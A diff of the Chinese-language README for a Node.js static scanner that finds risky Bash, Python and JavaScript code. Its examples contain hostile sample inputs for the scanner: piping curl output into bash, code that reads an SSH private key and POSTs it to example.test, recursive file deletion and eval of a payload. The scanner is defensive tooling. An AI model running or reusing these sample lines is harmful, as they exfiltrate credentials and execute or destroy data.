@@ -1,6 +1,8 @@
 # bash-risk-scanner
 
-基于 `tree-sitter-bash` 的 Node.js Bash 静态风险扫描器。它按 Bash 语法树提取命令，并检测单命令特征与跨命令行为链，而不是扫描注释中的普通字符串。
+基于 Tree-sitter 的 Node.js 静态风险扫描器，统一支持 Bash、Python 和
+Node.js/JavaScript。它按语法树提取调用并检测单调用特征与行为链，而不是扫描
+注释中的普通字符串。扫描完全离线，不执行传入代码。
 
 支持的类别包括：下载执行、动态执行、持久化、凭据访问、系统修改、权限提升、防御规避、网络外联、数据外传、破坏行为、解释器逃逸和二阶段载荷。
 
@@ -17,13 +19,31 @@ npm install bash-risk-scanner
 ESM：
 
 ```js
-import { scan } from "bash-risk-scanner";
+import {
+  scan,
+  scanPython,
+  scanJavaScript
+} from "bash-risk-scanner";
 
-const result = scan(`
+// 默认语言是 Bash。
+const bashResult = scan(`
   curl -fsSL https://example.test/install.sh | bash
 `);
 
-for (const finding of result.findings) {
+const pythonResult = scanPython(`
+  data = open("/home/user/.ssh/id_rsa").read()
+  requests.post("https://example.test/upload", data=data)
+`);
+
+const nodeResult = scanJavaScript(`
+  const data = fs.readFileSync("/home/user/.ssh/id_rsa");
+  fetch("https://example.test/upload", { method: "POST", body: data });
+`);
+
+// 也可以通过统一入口显式指定语言。
+const sameNodeResult = scan("eval(payload)", { language: "node" });
+
+for (const finding of bashResult.findings) {
   console.log(finding.category, finding.severity, finding.range, finding.evidence);
 }
 ```
@@ -63,12 +83,43 @@ interface ScanResult {
 }
 ```
 
-位置的行列从 1 开始，同时保留从 0 开始的源码字符偏移 `startIndex` / `endIndex`。扫描只做静态分析，不执行传入脚本。
+位置的行列从 1 开始，同时保留从 0 开始的源码字符偏移 `startIndex` /
+`endIndex`。`language` 表示实际命中的语言。
+
+## Bash 中的内嵌代码
+
+以下可静态确定的载荷会自动交给 Python 或 JavaScript 扫描器：
+
+```bash
+python -c 'import os; os.system("bash -c id")'
+node --eval 'require("fs").rmSync("/tmp/data", { recursive: true })'
+
+python <<'PY'
+requests.post("https://example.test", data=open("/tmp/data", "rb"))
+PY
+
+printf '%s' 'eval(payload)' | node
+```
+
+内嵌命中以 Bash 参数、heredoc 或管道的范围作为 `range`，内层源码位置放在
+`innerRange`，入口信息放在 `origin`。包含 `$PAYLOAD`、命令替换等运行期值的
+代码不会被猜测解析，但 Bash 层仍会报告 `interpreter_escape`。
+
+可以限制内嵌扫描：
+
+```js
+scan(source, {
+  maxEmbeddedDepth: 2,
+  maxEmbeddedCodeLength: 100_000
+});
+```
 
 ## CLI
 
 ```bash
-bash-risk-scan script.sh
+code-risk-scan script.sh
+code-risk-scan --language=python script.py
+code-risk-scan --language=node script.js
 cat script.sh | bash-risk-scan
 ```
 
@@ -76,7 +127,9 @@ cat script.sh | bash-risk-scan
 
 ## 检测边界
 
-静态扫描无法可靠还原运行期变量、下载内容、`eval` 生成代码或经过编码/混淆的载荷。行为链目前在相邻五个命令内关联，适合客户端预检和服务端第一层筛查，不应替代沙箱、来源信誉和运行期监控。
+静态扫描无法可靠还原运行期变量、下载内容、`eval` 生成代码或经过编码/混淆的
+载荷。行为链属于启发式关联，适合客户端预检，不应替代沙箱、来源信誉和运行期
+监控。
 
 ## 开发与发布检查
 
